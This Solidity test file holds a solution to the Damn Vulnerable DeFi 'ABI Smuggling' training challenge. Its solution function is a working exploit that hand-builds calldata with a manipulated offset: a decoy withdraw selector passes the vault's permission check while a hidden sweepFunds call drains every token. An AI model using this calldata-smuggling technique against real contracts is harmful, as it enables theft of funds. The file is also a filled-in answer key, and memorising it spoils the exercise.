// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        // Build the real payload: sweepFunds(recovery, token)
        bytes memory sweepCalldata = abi.encodeWithSelector(
            SelfAuthorizedVault.sweepFunds.selector,
            recovery,
            IERC20(address(token))
        );

        // Craft smuggled calldata for execute(address, bytes)
        //
        // Layout:
        // [0x00] 1cff79cd             execute() selector
        // [0x04] vault address         target param (word 1)
        // [0x24] 0x80                  offset to bytes data (word 2) - MANIPULATED (normally 0x40)
        // [0x44] 0x00...00             padding (word 3, fills bytes 68-99)
        // [0x64] d9caed12 00...00      DECOY: withdraw selector at byte 100 (passes permission check)
        // [0x84] length                length of real actionData
        // [0xa4] 85fb709d ...          REAL PAYLOAD: sweepFunds calldata
        bytes memory smuggledCalldata = abi.encodePacked(
            bytes4(0x1cff79cd),                         // execute() selector
            uint256(uint160(address(vault))),            // target = vault
            uint256(0x80),                               // offset = 0x80 (skip past decoy)
            uint256(0),                                  // padding
            bytes32(bytes4(0xd9caed12)),                 // DECOY: withdraw selector at byte 100
            uint256(sweepCalldata.length),               // length of real actionData
            sweepCalldata                                // sweepFunds(recovery, token)
        );

        (bool success,) = address(vault).call(smuggledCalldata);
        require(success, "Attack failed");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
